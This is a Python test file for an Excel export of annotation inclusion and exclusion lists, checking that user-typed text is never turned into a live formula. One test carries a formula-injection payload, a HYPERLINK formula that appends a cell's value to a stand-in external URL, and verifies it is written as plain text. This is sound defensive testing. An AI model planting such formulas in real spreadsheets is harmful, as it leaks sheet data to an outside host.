"""The Excel export of the global inclusion and exclusion lists.

The rows hold text that users typed (the annotated word, a reason, a
comment), and an admin opens the file in a spreadsheet program, so none of it
may become a formula there.
"""
import html
import io
import re
import zipfile

from neo4japp.services.export import ExcelExportService


def cells(xlsx: bytes):
    """Map each cell of the first sheet to its value and to whether it holds a formula."""
    with zipfile.ZipFile(io.BytesIO(xlsx)) as archive:
        strings = re.findall(
            r'<si><t[^>]*>(.*?)</t></si>', archive.read('xl/sharedStrings.xml').decode(), re.S
        )
        sheet = archive.read('xl/worksheets/sheet1.xml').decode()
    result = {}
    for ref, attrs, body in re.findall(r'<c r="([A-Z]+\d+)"([^>]*)>(.*?)</c>', sheet, re.S):
        formula = re.search(r'<f>(.*?)</f>', body, re.S)
        if formula:
            result[ref] = ('formula', html.unescape(formula.group(1)))
        else:
            value = re.search(r'<v>(.*?)</v>', body, re.S).group(1)
            result[ref] = ('text', html.unescape(strings[int(value)])) if 't="s"' in attrs \
                else ('value', value)
    return result


def test_writes_a_header_row_and_the_rows():
    xlsx = ExcelExportService().get_bytes([
        {'text': 'TP53', 'reason': 'Not an entity'},
        {'text': 'BRCA1', 'reason': ''},
    ])

    sheet = cells(xlsx)

    assert sheet['A1'] == ('text', 'text')
    assert sheet['B1'] == ('text', 'reason')
    assert sheet['A2'] == ('text', 'TP53')
    assert sheet['B2'] == ('text', 'Not an entity')
    assert sheet['A3'] == ('text', 'BRCA1')


def test_writes_text_that_looks_like_a_formula_as_text():
    comment = '=HYPERLINK("http://example.test/?"&A2,"Details")'

    sheet = cells(ExcelExportService().get_bytes([{'text': 'TP53', 'comment': comment}]))

    assert sheet['B2'] == ('text', comment)


def test_exports_an_empty_list():
    xlsx = ExcelExportService().get_bytes([])

    with zipfile.ZipFile(io.BytesIO(xlsx)) as archive:
        assert 'xl/worksheets/sheet1.xml' in archive.namelist()


def test_names_the_file_with_an_xlsx_extension():
    assert re.fullmatch(
        r'global_exclusions_\d{8}_\d{6}\.xlsx',
        ExcelExportService().get_filename('global_exclusions'),
    )
